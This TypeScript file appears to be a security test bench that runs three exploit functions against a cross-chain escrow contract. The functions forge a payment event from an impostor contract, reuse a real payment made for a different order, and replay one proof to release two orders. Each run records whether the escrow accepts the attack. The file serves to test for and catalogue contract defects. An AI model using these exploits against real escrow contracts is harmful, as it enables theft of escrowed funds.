/**
 * The falsifier.
 *
 * Each attack builds a LEGITIMATE Attestcoin proof of something that is not the payment for the
 * order it releases, submits it to a target escrow, and records whether the escrow accepted it.
 * An accepted attack is a confirmed catalogue finding, with the CC3 transaction hash as evidence.
 *
 * Every proof here would pass the precompile. That is the whole point: the precompile is not what
 * fails. The consumer's missing third check is.
 */
import { ethers } from "ethers";

import { buildProof, isAttested, waitUntilAttested, resolveSepoliaChainKey } from "./proof";

export type AttackStatus = "accepted" | "rejected" | "error";

export interface Finding {
  id: string; // catalogue id, e.g. "B-02"
  title: string;
  status: AttackStatus;
  /** For a defect, "accepted" is the vulnerable outcome; for a hardened target we expect "rejected". */
  vulnerableWhen: AttackStatus;
  detail: string;
  evidenceTx?: string;
  sourceTx?: string;
}

export interface BenchContext {
  cc3: ethers.JsonRpcProvider;
  sepolia: ethers.JsonRpcProvider;
  cc3Signer: ethers.Wallet;
  sepoliaSigner: ethers.Wallet;
  proverUrl: string;
  chainKey: number;
  escrow: ethers.Contract;
  source: ethers.Contract;
  impostor: ethers.Contract;
}

const PAYMENT_SETTLED_SIG = ethers.id("PaymentSettled(bytes32,address,address,uint256)");

/** A fresh order id per run so reruns never collide. */
function newOrderId(tag: string): string {
  return ethers.id(`${tag}:${Date.now()}:${Math.random()}`);
}

async function fundOrder(ctx: BenchContext, orderId: string, amountWei: bigint): Promise<void> {
  const seller = ctx.cc3Signer.address; // the account that profits from a wrongful release
  const tx = await ctx.escrow.fund(orderId, seller, { value: amountWei });
  await tx.wait();
}

async function attemptRelease(
  ctx: BenchContext,
  orderId: string,
  proof: Awaited<ReturnType<typeof buildProof>>
): Promise<{ status: AttackStatus; detail: string; tx?: string }> {
  try {
    const tx = await ctx.escrow.release(
      orderId,
      proof.chainKey,
      proof.height,
      proof.txBytes,
      proof.merkle,
      proof.continuity
    );
    const receipt = await tx.wait();
    return { status: "accepted", detail: "escrow released against the proof", tx: receipt!.hash };
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e);
    const reason = /reverted with reason string '([^']*)'/.exec(msg)?.[1] ?? msg.split("\n")[0];
    return { status: "rejected", detail: `reverted: ${reason}` };
  }
}

/**
 * B-02 / B-06. The impostor contract emits PaymentSettled with the order's fields and never pays.
 * The proof of that emission is completely valid. A consumer that does not pin the emitting
 * contract releases real escrow against a free forgery.
 */
export async function attackImpostor(ctx: BenchContext, amountWei: bigint): Promise<Finding> {
  const base: Finding = {
    id: "B-02",
    title: "Emitting contract not pinned; a look-alike forges the event",
    status: "error",
    vulnerableWhen: "accepted",
    detail: "",
  };
  try {
    const orderId = newOrderId("impostor");
    await fundOrder(ctx, orderId, amountWei);

    // Forge the event on Sepolia from the impostor, for the same order, with no payment.
    const forgeTx = await ctx.impostor.forge(
      orderId,
      ctx.sepoliaSigner.address,
      ctx.cc3Signer.address,
      amountWei
    );
    const forgeReceipt = await forgeTx.wait();
    base.sourceTx = forgeReceipt!.hash;

    await waitUntilAttested(ctx.cc3, ctx.chainKey, forgeReceipt!.blockNumber);
    const proof = await buildProof(ctx.chainKey, ctx.proverUrl, forgeReceipt!.hash);

    const out = await attemptRelease(ctx, orderId, proof);
    return { ...base, status: out.status, detail: out.detail, evidenceTx: out.tx };
  } catch (e) {
    return { ...base, detail: e instanceof Error ? e.message : String(e) };
  }
}

/**
 * B-06. A genuine payment on the honest contract, but for a DIFFERENT order, releases this order,
 * because the orderId inside the log is never compared to the order being released.
 */
export async function attackWrongOrder(ctx: BenchContext, amountWei: bigint): Promise<Finding> {
  const base: Finding = {
    id: "B-06",
    title: "Proven payment not bound to the order it releases",
    status: "error",
    vulnerableWhen: "accepted",
    detail: "",
  };
  try {
    const fundedOrder = newOrderId("victim");
    const paidOrder = newOrderId("other"); // a real payment, for something else entirely
    await fundOrder(ctx, fundedOrder, amountWei);

    // Pay one wei for a completely different order on the honest contract.
    const payTx = await ctx.source.settle(paidOrder, ctx.cc3Signer.address, { value: 1n });
    const payReceipt = await payTx.wait();
    base.sourceTx = payReceipt!.hash;

    await waitUntilAttested(ctx.cc3, ctx.chainKey, payReceipt!.blockNumber);
    const proof = await buildProof(ctx.chainKey, ctx.proverUrl, payReceipt!.hash);

    // Release the FUNDED order using the proof of the OTHER order's payment.
    const out = await attemptRelease(ctx, fundedOrder, proof);
    return { ...base, status: out.status, detail: out.detail, evidenceTx: out.tx };
  } catch (e) {
    return { ...base, detail: e instanceof Error ? e.message : String(e) };
  }
}

/**
 * B-04. One real payment, reused to release a second order, because the proof itself carries no
 * replay guard. Marking an order released protects that order, not the proof.
 */
export async function attackReplay(ctx: BenchContext, amountWei: bigint): Promise<Finding> {
  const base: Finding = {
    id: "B-04",
    title: "No replay guard on the proof; one payment releases many orders",
    status: "error",
    vulnerableWhen: "accepted",
    detail: "",
  };
  try {
    const orderA = newOrderId("replayA");
    const orderB = newOrderId("replayB");
    await fundOrder(ctx, orderA, amountWei);
    await fundOrder(ctx, orderB, amountWei);

    // A single genuine payment.
    const payTx = await ctx.source.settle(orderA, ctx.cc3Signer.address, { value: amountWei });
    const payReceipt = await payTx.wait();
    base.sourceTx = payReceipt!.hash;

    await waitUntilAttested(ctx.cc3, ctx.chainKey, payReceipt!.blockNumber);
    const proof = await buildProof(ctx.chainKey, ctx.proverUrl, payReceipt!.hash);

    const first = await attemptRelease(ctx, orderA, proof);
    const second = await attemptRelease(ctx, orderB, proof); // same proof, second order

    if (second.status === "accepted") {
      return {
        ...base,
        status: "accepted",
        detail: `same proof released two orders (first ${first.status}, second accepted)`,
        evidenceTx: second.tx,
      };
    }
    return { ...base, status: second.status, detail: `second release ${second.detail}` };
  } catch (e) {
    return { ...base, detail: e instanceof Error ? e.message : String(e) };
  }
}

export const _internal = { PAYMENT_SETTLED_SIG, isAttested, resolveSepoliaChainKey };
